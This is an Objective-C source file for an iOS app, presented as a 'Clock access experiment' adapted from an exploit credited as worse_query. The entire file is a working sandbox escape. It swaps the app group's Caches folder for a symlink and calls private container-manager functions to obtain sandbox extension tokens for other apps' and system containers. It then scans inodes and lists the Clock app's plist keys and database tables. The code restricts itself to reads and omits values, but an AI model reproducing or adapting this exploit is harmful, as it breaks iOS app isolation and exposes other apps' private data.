/*
 * Clock access experiment, adapted from worse_query by Taj C (forcequit).
 * Copyright (C) 2026 Taj C (forcequit), GPL-3.0-or-later.
 * Daybreak adaptations preserve the app group's cache directory, bound discovery,
 * release extensions, and inspect only identified Clock container contents.
 * See LICENSE and THIRD_PARTY_NOTICES.md. No warranty.
 */
#import "ClockAccess.h"
#import <TargetConditionals.h>
#import <dlfcn.h>
#import <xpc/xpc.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/file.h>
#import <sys/xattr.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <sqlite3.h>

static NSString *Normalize(NSString *p) {
    p=p.stringByStandardizingPath;
    return [p hasPrefix:@"/var/"]?[@"/private" stringByAppendingString:p]:p;
}
static BOOL ClockID(NSString *s) {
    return [@[@"com.apple.mobiletimer",@"com.apple.mobiletimerd",@"group.com.apple.mobiletimer",@"group.com.apple.mobiletimerd",@"systemgroup.com.apple.mobiletimer",@"systemgroup.com.apple.mobiletimerd"] containsObject:s];
}
static NSArray *Roots(void) { return @[@"/private/var/mobile/Containers/Data/Application",@"/private/var/mobile/Containers/Data/InternalDaemon",@"/private/var/mobile/Containers/Shared/AppGroup",@"/private/var/containers/Shared/SystemGroup",@"/private/var/containers/Data/System"]; }
static BOOL ContainerPath(NSString *p) { return [Roots() containsObject:p.stringByDeletingLastPathComponent] && p.lastPathComponent.length>0; }
typedef void *(*Create)(void);
typedef void (*SetNumber)(void *,uint64_t);
typedef void (*SetIDs)(void *,xpc_object_t);
typedef void *(*Result)(void *);
typedef void (*FreeQuery)(void *);
typedef char *(*Token)(void *);
typedef int64_t (*Consume)(const char *);
typedef int (*Release)(int64_t);
typedef void (*Iterate)(void *,bool (^)(void *));
typedef const char *(*ObjectString)(void *);

@interface DBClockInspector : NSObject
@property(nonatomic) NSMutableString *report;
@property(nonatomic) NSString *group;
@property(nonatomic) NSMutableSet<NSString *> *seen;
@property(nonatomic) NSMutableDictionary<NSString *,NSString *> *identifiers;
@property(nonatomic) NSDate *deadline;
@property(nonatomic) NSUInteger matches;
@property(nonatomic) BOOL cacheFailure;
#ifdef CLOCK_ACCESS_TESTING
@property(nonatomic) NSString *testGroupRoot;
#endif
@end
@implementation DBClockInspector
- (void)line:(NSString *)s { [self.report appendFormat:@"%@\n",s]; }
- (NSString *)signedGroup {
    typedef CFTypeRef (*TaskCreate)(CFAllocatorRef);
    typedef CFTypeRef (*TaskValue)(CFTypeRef,CFStringRef,CFErrorRef *);
    void *security=dlopen("/System/Library/Frameworks/Security.framework/Security",RTLD_NOW|RTLD_LOCAL);
    TaskCreate create=(TaskCreate)dlsym(security?:RTLD_DEFAULT,"SecTaskCreateFromSelf");
    TaskValue value=(TaskValue)dlsym(security?:RTLD_DEFAULT,"SecTaskCopyValueForEntitlement");
    CFTypeRef task=create?create(kCFAllocatorDefault):NULL;
    CFTypeRef raw=task&&value?value(task,CFSTR("com.apple.security.application-groups"),NULL):NULL;
    NSArray *groups=raw&&CFGetTypeID(raw)==CFArrayGetTypeID()?(__bridge NSArray *)raw:nil;
    NSString *found=nil;
    for(id g in groups) if([g isKindOfClass:NSString.class] && [NSFileManager.defaultManager containerURLForSecurityApplicationGroupIdentifier:g]) {found=g;break;}
    if(raw) CFRelease(raw); if(task) CFRelease(task); if(security) dlclose(security);
    return found;
}
- (void)release:(int64_t)handle {
    Release release=(Release)dlsym(RTLD_DEFAULT,"sandbox_extension_release");
    if(handle>=0 && release) release(handle);
}
// The only mutation is an owned App Group Caches symlink swap. Preserve its
// original inode and contents. A fixed saved name permits recovery after a crash.
- (int64_t)grant:(NSString *)path alternate:(BOOL)alternate {
    if(self.cacheFailure) return -18;
    NSFileManager *fm=NSFileManager.defaultManager;
    NSURL *root=nil;
#ifdef CLOCK_ACCESS_TESTING
    if(self.testGroupRoot)root=[NSURL fileURLWithPath:self.testGroupRoot];
#endif
    if(!root)root=[fm containerURLForSecurityApplicationGroupIdentifier:self.group];
    if(!root) return -1;
    NSString *library=[root.path stringByAppendingPathComponent:@"Library"];
    if(![fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil]) return -10;
    NSString *caches=[library stringByAppendingPathComponent:@"Caches"];
    NSString *saved=[library stringByAppendingPathComponent:@".daybreak-wq-caches.saved"];
    NSString *lockPath=[library stringByAppendingPathComponent:@".daybreak-wq.lock"];
    int lock=open(lockPath.fileSystemRepresentation,O_RDWR|O_CREAT|O_NOFOLLOW,0600);
    if(lock<0) return -11;
    if(flock(lock,LOCK_EX|LOCK_NB)!=0){close(lock);return -12;}
    int64_t handle=-2;
    struct stat st={0},backup={0};
    // Recover an interrupted swap. Never remove a real directory to recover.
    if(lstat(saved.fileSystemRepresentation,&backup)==0) {
        if(!S_ISDIR(backup.st_mode)) { self.cacheFailure=YES; goto done; }
        if(lstat(caches.fileSystemRepresentation,&st)==0) {
            if(!S_ISLNK(st.st_mode) || unlink(caches.fileSystemRepresentation)!=0){self.cacheFailure=YES;goto done;}
        } else if(errno!=ENOENT){self.cacheFailure=YES;goto done;}
        if(rename(saved.fileSystemRepresentation,caches.fileSystemRepresentation)!=0){self.cacheFailure=YES;goto done;}
    } else if(errno!=ENOENT) {self.cacheFailure=YES;goto done;}
    if(lstat(caches.fileSystemRepresentation,&st)!=0) {
        if(errno!=ENOENT || mkdir(caches.fileSystemRepresentation,0700)!=0){handle=-13;goto done;}
        if(lstat(caches.fileSystemRepresentation,&st)!=0){handle=-13;goto done;}
    }
    if(!S_ISDIR(st.st_mode)){handle=-14;goto done;}
    if(rename(caches.fileSystemRepresentation,saved.fileSystemRepresentation)!=0){handle=-15;goto done;}
    @try {
        if(symlink(path.fileSystemRepresentation,caches.fileSystemRepresentation)!=0){handle=-4;}
        else {
            void *mgr=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);
            if(mgr) {
                Create create=(Create)dlsym(mgr,"container_query_create");
                SetNumber cls=(SetNumber)dlsym(mgr,"container_query_set_class"),part=(SetNumber)dlsym(mgr,"container_query_operation_set_part"),flags=(SetNumber)dlsym(mgr,"container_query_operation_set_flags");
                SetIDs groups=(SetIDs)dlsym(mgr,"container_query_set_group_identifiers");
                Result single=(Result)dlsym(mgr,"container_query_get_single_result");
                FreeQuery freeQuery=(FreeQuery)dlsym(mgr,"container_query_free");
                Token copy=(Token)dlsym(mgr,"container_copy_sandbox_token");
                Consume consume=(Consume)dlsym(RTLD_DEFAULT,"sandbox_extension_consume");
                if(create&&cls&&part&&flags&&groups&&single&&freeQuery&&copy&&consume) {
                    void *q=create();
                    if(q) {
                        @try {
                            cls(q,7); groups(q,xpc_string_create(self.group.UTF8String)); part(q,3);
                            flags(q,alternate?0x0000000800000000ULL:0x0000008000000000ULL);
                            void *r=single(q); char *token=r?copy(r):NULL;
                            handle=token?consume(token):(r?-6:-5);
                            if(token)free(token);
                        } @finally {freeQuery(q);}
                    } else handle=-3;
                }
                dlclose(mgr);
            }
        }
    } @catch(NSException *e) {handle=-9;}
    @finally {
        BOOL ok=YES;
        if(lstat(caches.fileSystemRepresentation,&st)==0) {
            ok=S_ISLNK(st.st_mode) && unlink(caches.fileSystemRepresentation)==0;
        } else ok=errno==ENOENT;
        if(ok) ok=rename(saved.fileSystemRepresentation,caches.fileSystemRepresentation)==0;
        if(!ok) {self.cacheFailure=YES;[self release:handle];handle=-18;}
    }
done:
    flock(lock,LOCK_UN);close(lock);
    return self.cacheFailure?-18:handle;
}
- (int64_t)grant:(NSString *)path {
    int64_t h=[self grant:path alternate:NO];
    if(h<0 && !self.cacheFailure) h=[self grant:path alternate:YES];
    return h;
}
- (void)inspectFile:(NSString *)path size:(off_t)size {
    NSString *name=path.lastPathComponent.lowercaseString;
    if([name.pathExtension isEqual:@"plist"] && size>0 && size<=2*1024*1024) {
        NSData *data=[NSData dataWithContentsOfFile:path options:NSDataReadingUncached error:nil];
        id plist=data?[NSPropertyListSerialization propertyListWithData:data options:NSPropertyListImmutable format:NULL error:nil]:nil;
        if([plist isKindOfClass:NSDictionary.class]) {
            NSArray *keys=[[(NSDictionary *)plist allKeys] sortedArrayUsingSelector:@selector(compare:)];
            [self line:[NSString stringWithFormat:@"  plist keys: %@",[[keys subarrayWithRange:NSMakeRange(0,MIN(keys.count,80))] componentsJoinedByString:@", "]]];
            for(NSString *key in keys) if([key.lowercaseString containsString:@"alarm"] || [key.lowercaseString containsString:@"sleep"]) {
                id v=plist[key]; NSString *shape=[v isKindOfClass:NSArray.class]?[NSString stringWithFormat:@"array (%lu entries)",(unsigned long)[v count]]:[v isKindOfClass:NSDictionary.class]?[NSString stringWithFormat:@"dictionary (%lu keys)",(unsigned long)[v count]]:[v isKindOfClass:NSData.class]?[NSString stringWithFormat:@"data (%lu bytes)",(unsigned long)[v length]]:NSStringFromClass([v class]);
                [self line:[NSString stringWithFormat:@"  %@: %@ (value omitted)",key,shape]];
            }
        } else [self line:@"  plist could not be parsed as a dictionary"];
    }
    if([@[@"sqlite",@"sqlite3",@"db"] containsObject:name.pathExtension]) {
        sqlite3 *db=NULL; int rc=sqlite3_open_v2([[[NSURL fileURLWithPath:path] absoluteString] stringByAppendingString:@"?immutable=1"].UTF8String,&db,SQLITE_OPEN_READONLY|SQLITE_OPEN_NOMUTEX|SQLITE_OPEN_URI,NULL);
        [self line:[NSString stringWithFormat:@"  SQLite immutable base-file schema open rc=%d (WAL excluded)",rc]];
        if(rc==SQLITE_OK) {
            sqlite3_busy_timeout(db,200); sqlite3_stmt *stmt=NULL;
            rc=sqlite3_prepare_v2(db,"SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 80",-1,&stmt,NULL);
            if(rc==SQLITE_OK) while(sqlite3_step(stmt)==SQLITE_ROW) {
                const unsigned char *name=sqlite3_column_text(stmt,0);
                if(name)[self line:[NSString stringWithFormat:@"  table: %s",name]];
            }
            [self line:[NSString stringWithFormat:@"  schema query rc=%d; alarm rows were not read",rc]];
            if(stmt)sqlite3_finalize(stmt);
        }
        if(db)sqlite3_close(db);
    }
}
- (void)inspectContainer:(NSString *)path identifier:(NSString *)identifier {
    self.matches++; [self line:[NSString stringWithFormat:@"CLOCK container: %@\n%@",identifier,path]];
    NSMutableArray<NSDictionary *> *todo=[NSMutableArray arrayWithObject:@{@"path":path,@"depth":@0}];
    NSUInteger visited=0;
    while(todo.count && visited++<500 && self.deadline.timeIntervalSinceNow>0) {
        NSDictionary *entry=todo.firstObject;[todo removeObjectAtIndex:0];
        NSString *dir=entry[@"path"];NSUInteger depth=[entry[@"depth"] unsignedIntegerValue];
        int64_t handle=[self grant:dir]; NSError *error=nil;
        NSArray *names=[NSFileManager.defaultManager contentsOfDirectoryAtPath:dir error:&error];
        if(!names) [self line:[NSString stringWithFormat:@"  read failed: %@ code=%ld token=%lld",[dir substringFromIndex:path.length],(long)error.code,handle]];
        for(NSString *name in names) {
            if([name hasPrefix:@"."])continue;
            NSString *p=[dir stringByAppendingPathComponent:name];struct stat st;
            if(lstat(p.fileSystemRepresentation,&st)!=0)continue;
            if(S_ISDIR(st.st_mode) && depth<4 && ![name isEqual:@"Caches"] && ![name isEqual:@"tmp"]) {
                if(todo.count<500)[todo addObject:@{@"path":p,@"depth":@(depth+1)}];
            } else if(S_ISREG(st.st_mode) && ([@[@"plist",@"sqlite",@"sqlite3",@"db"] containsObject:name.pathExtension.lowercaseString] || [name.lowercaseString containsString:@"alarm"])) {
                [self line:[NSString stringWithFormat:@"  file: %@ (%lld bytes)",[p substringFromIndex:path.length],st.st_size]];
                [self inspectFile:p size:st.st_size];
            }
        }
        [self release:handle];
    }
    if(todo.count)[self line:@"  Clock listing stopped at the depth/item/time limit; listing is partial"];
}
- (void)candidate:(NSString *)path {
    path=Normalize(path);
    if(!ContainerPath(path) || [self.seen containsObject:path] || self.deadline.timeIntervalSinceNow<=0)return;
    [self.seen addObject:path];
    int64_t handle=[self grant:path]; char buf[1024]={0};
    ssize_t n=getxattr(path.fileSystemRepresentation,"com.apple.containermanager.identifier",buf,sizeof(buf)-1,0,0);
    NSString *identifier=n>0?[[NSString alloc] initWithBytes:buf length:(NSUInteger)n encoding:NSUTF8StringEncoding]:self.identifiers[path];
    identifier=[identifier stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
    if(!identifier.length) {
        NSString *meta=[path stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
        struct stat st;
        if(lstat(meta.fileSystemRepresentation,&st)==0 && st.st_size<256*1024) {
            NSDictionary *d=[NSDictionary dictionaryWithContentsOfFile:meta];id v=d[@"MCMMetadataIdentifier"];
            if([v isKindOfClass:NSString.class])identifier=v;
        }
    }
    [self release:handle];
    if(ClockID(identifier)) [self inspectContainer:path identifier:identifier];
}
- (void)queryCandidates {
    void *mgr=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!mgr)return;
    Create create=(Create)dlsym(mgr,"container_query_create");SetNumber cls=(SetNumber)dlsym(mgr,"container_query_set_class");
    Iterate iterate=(Iterate)dlsym(mgr,"container_query_iterate_results_sync");FreeQuery freeQ=(FreeQuery)dlsym(mgr,"container_query_free");
    ObjectString getPath=(ObjectString)dlsym(mgr,"container_object_get_path"),getID=(ObjectString)dlsym(mgr,"container_object_get_identifier");
    if(!getID)getID=(ObjectString)dlsym(mgr,"container_result_get_identifier");
    NSMutableSet *candidates=[NSMutableSet new];
    if(create&&cls&&iterate&&freeQ&&getPath) for(uint64_t c=1;c<=14;c++) {
        if(self.deadline.timeIntervalSinceNow<=0)break;
        void *q=create();if(!q)continue;cls(q,c);
        @try {iterate(q,^bool(void *obj){
            if(self.deadline.timeIntervalSinceNow<=0)return false;
            const char *p=obj?getPath(obj):NULL,*i=obj&&getID?getID(obj):NULL;
            NSString *path=p?Normalize([NSString stringWithUTF8String:p]):nil;
            if(path && ContainerPath(path)) {
                if(i) self.identifiers[path]=[NSString stringWithUTF8String:i]?:@"";
                [candidates addObject:path];
            }
            return true;
        });} @catch(NSException *e){[self line:[NSString stringWithFormat:@"Container query class %llu exception: %@",c,e.name]];}
        @finally {freeQ(q);}
    }
    dlclose(mgr);
    for(NSString *p in candidates)[self candidate:p];
}
- (void)scanInodes {
    typedef ssize_t (*GetPath)(char *,size_t,fsid_t *,uint64_t);
    GetPath getPath=(GetPath)dlsym(RTLD_DEFAULT,"fsgetpath");
    if(!getPath){[self line:@"fsgetpath unavailable; no inode scan"];return;}
    struct statfs volume;struct stat st;
    NSString *probe=[NSTemporaryDirectory() stringByAppendingPathComponent:NSUUID.UUID.UUIDString];
    int fd=open(probe.fileSystemRepresentation,O_WRONLY|O_CREAT|O_EXCL,0600);
    BOOL ok=fd>=0 && fstat(fd,&st)==0 && fstatfs(fd,&volume)==0;
    if(fd>=0)close(fd);unlink(probe.fileSystemRepresentation);
    if(!ok){[self line:@"Could not determine the data-volume scan bound"];return;}
    uint64_t limit=(uint64_t)st.st_ino+100000;
    uint64_t start=(uint64_t)[NSUserDefaults.standardUserDefaults doubleForKey:@"clockProbeCursor"];
    if(start<2 || start>limit)start=2;
    uint64_t ino=start;char path[2048];
    for(;ino<=limit && self.deadline.timeIntervalSinceNow>0 && !self.cacheFailure;ino++) {
        @autoreleasepool {
            path[0]=0; fsid_t fsid=volume.f_fsid;ssize_t n=getPath(path,sizeof(path),&fsid,ino);
            if(n>0 && memchr(path,0,sizeof(path))) {
                NSString *p=[NSString stringWithUTF8String:path];
                if(p && ContainerPath(p))[self candidate:p];
            }
        }
    }
    [NSUserDefaults.standardUserDefaults setDouble:ino>limit?2:(double)ino forKey:@"clockProbeCursor"];
    [self line:[NSString stringWithFormat:@"Inode discovery: %llu through %llu of %llu. %@",start,ino-1,limit,ino>limit?@"This scan range completed; visibility can still be restricted.":@"Partial scan. Tap again to continue from this position."]];
}
- (NSString *)run {
    self.report=[NSMutableString new];self.seen=[NSMutableSet new];self.identifiers=[NSMutableDictionary new];
    [self line:@"Clock filesystem experiment (worse_query). No XCTest or Siri invoked.\nAlarm files are read only. No alarm mutation or scheduling is implemented."];
#if TARGET_OS_SIMULATOR
    [self line:@"Simulator: exploit disabled. A signed phone is required."];return self.report;
#endif
    self.group=[self signedGroup];
    if(!self.group){[self line:@"STOP -1: No signed, accessible App Group. Re-sign with an App Group supported by the provisioning profile. An entitlement added to an IPA alone is insufficient."];return self.report;}
    [self line:[NSString stringWithFormat:@"Signed App Group: %@",self.group]];
    self.deadline=[NSDate dateWithTimeIntervalSinceNow:25];
    [self queryCandidates];
    for(NSString *root in Roots()) {
        if(self.deadline.timeIntervalSinceNow<=0)break;
        int64_t h=[self grant:root];NSError *error=nil;
        NSArray *children=[NSFileManager.defaultManager contentsOfDirectoryAtPath:root error:&error];
        [self line:[NSString stringWithFormat:@"Container parent %@: token=%lld, list=%@",root,h,children?@"readable":[NSString stringWithFormat:@"error %ld",(long)error.code]]];
        [self release:h];
        for(NSString *name in children)[self candidate:[root stringByAppendingPathComponent:name]];
    }
    if(self.deadline.timeIntervalSinceNow>0 && !self.cacheFailure)[self scanInodes];
    [self line:[NSString stringWithFormat:@"Identified Clock containers: %lu; candidate metadata checked: %lu",(unsigned long)self.matches,(unsigned long)self.seen.count]];
    if(self.cacheFailure)[self line:@"STOP -18: App Group cache recovery failed. Original contents remain at Library/.daybreak-wq-caches.saved. No further queries attempted."];
    [self line:@"Clock service entitlements, live daemon reload, and locked-screen execution are NOT established by this filesystem test. No upload occurred."];
    return self.report;
}
@end
@implementation ClockAccess
+ (void)inspect:(void (^)(NSString *))completion {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY,0),^{
        DBClockInspector *probe=[DBClockInspector new];NSString *report=nil;
        @try { report=[probe run]; }
        @catch(NSException *e) {report=[NSString stringWithFormat:@"%@\nClock inspection stopped: %@",probe.report?:@"",e.name];}
        dispatch_async(dispatch_get_main_queue(),^{completion(report);});
    });
}
@end
